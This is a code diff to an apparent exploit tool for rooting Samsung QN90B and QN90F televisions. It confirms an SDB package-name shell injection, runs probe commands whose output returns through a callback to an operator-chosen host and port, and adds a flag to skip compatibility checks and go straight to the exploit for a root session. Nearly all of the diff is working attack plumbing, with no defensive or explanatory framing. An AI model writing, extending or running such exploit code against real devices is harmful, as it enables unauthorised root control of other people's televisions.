@@ -205,13 +205,56 @@ def command_remote_events(arguments: argparse.Namespace) -> int:
     return 0
 
 
-def preflight_qn90f(host: str, timeout: float) -> TargetAssessment:
+def _callback_progress(stage: str, timeout: float):
+    def report(callback: str, bind: str, port: int) -> None:
+        binding = "" if callback == bind else f" (bound at {bind}:{port})"
+        print(
+            f"{stage}: waiting up to {timeout:g}s for TV callback at "
+            f"{callback}:{port}{binding}",
+            file=sys.stderr,
+            flush=True,
+        )
+
+    return report
+
+
+def preflight_qn90f(
+    host: str,
+    timeout: float,
+    *,
+    callback_host: str | None = None,
+    bind_host: str | None = None,
+    port: int = 0,
+) -> TargetAssessment:
     client = SdbClient(find_sdb(), host, timeout=timeout)
     client.connect()
-    result = client.capture(
-        QN90F_PROFILE.probe_command(),
-        timeout=max(timeout, 20.0),
+    client.require_device()
+    client.require_shell_injection()
+    print(
+        "Preflight: SDB package-name shell injection confirmed",
+        file=sys.stderr,
+        flush=True,
     )
+    callback_timeout = max(timeout, 20.0)
+    try:
+        result = client.capture(
+            QN90F_PROFILE.probe_command(),
+            callback_host=callback_host,
+            bind_host=bind_host,
+            port=port,
+            timeout=callback_timeout,
+            on_listening=_callback_progress("Preflight", callback_timeout),
+        )
+    except SdbError as error:
+        raise CommandError(
+            "SDB package-name shell injection was confirmed, but the preflight "
+            f"callback failed: {error}"
+        ) from error
+    if not result.output.strip():
+        raise CommandError(
+            "preflight callback connected but returned no output "
+            f"(SDB injection exit {result.transport_returncode})"
+        )
     assessment = QN90F_PROFILE.assess(result.output)
     try:
         return assessment.require_compatible()
@@ -245,9 +288,20 @@ def command_preflight(arguments: argparse.Namespace) -> int:
             QN90B_PAYLOAD_DIRECTORY,
             sdb_timeout=arguments.sdb_timeout,
         )
-        assessment = exploit.preflight()
+        assessment = exploit.preflight(
+            callback_host=arguments.callback_host,
+            bind_host=arguments.bind_host,
+            port=arguments.port,
+            on_listening=_callback_progress("Preflight", 20.0),
+        )
     else:
-        assessment = preflight_qn90f(arguments.host, arguments.sdb_timeout)
+        assessment = preflight_qn90f(
+            arguments.host,
+            arguments.sdb_timeout,
+            callback_host=arguments.callback_host,
+            bind_host=arguments.bind_host,
+            port=arguments.port,
+        )
     print_assessment(assessment)
     return 0
 
@@ -274,7 +328,22 @@ def command_qn90b_uep(arguments: argparse.Namespace) -> int:
 
 
 def command_qn90f_root(arguments: argparse.Namespace) -> int:
-    print_assessment(preflight_qn90f(arguments.host, arguments.sdb_timeout))
+    if arguments.skip_preflight:
+        print(
+            "Preflight: skipped; proceeding without target compatibility checks",
+            file=sys.stderr,
+            flush=True,
+        )
+    else:
+        print_assessment(
+            preflight_qn90f(
+                arguments.host,
+                arguments.sdb_timeout,
+                callback_host=arguments.callback_host,
+                bind_host=arguments.bind_host,
+                port=arguments.port,
+            )
+        )
     return run_root_session(
         TVDeviceProfile(),
         arguments.host,
@@ -546,6 +615,9 @@ def build_parser() -> argparse.ArgumentParser:
     preflight = commands.add_parser("preflight")
     preflight.add_argument("tv", choices=("qn90b", "qn90f"))
     add_transport_options(preflight)
+    preflight.add_argument("--callback-host")
+    preflight.add_argument("--bind-host")
+    preflight.add_argument("--port", type=int, default=0)
     preflight.set_defaults(handler=command_preflight)
 
     qn90b = commands.add_parser("qn90b")
@@ -568,6 +640,11 @@ def build_parser() -> argparse.ArgumentParser:
     qn90f_root.add_argument("--bind-host")
     qn90f_root.add_argument("--port", type=int, default=0)
     qn90f_root.add_argument("--accept-timeout", type=float, default=30.0)
+    qn90f_root.add_argument(
+        "--skip-preflight",
+        action="store_true",
+        help="proceed directly to the exploit without compatibility checks",
+    )
     qn90f_root.set_defaults(handler=command_qn90f_root)
     qn90f_uep = qn90f_commands.add_parser("uep")
     add_root_options(qn90f_uep, QN90F_PAYLOAD_DIRECTORY)
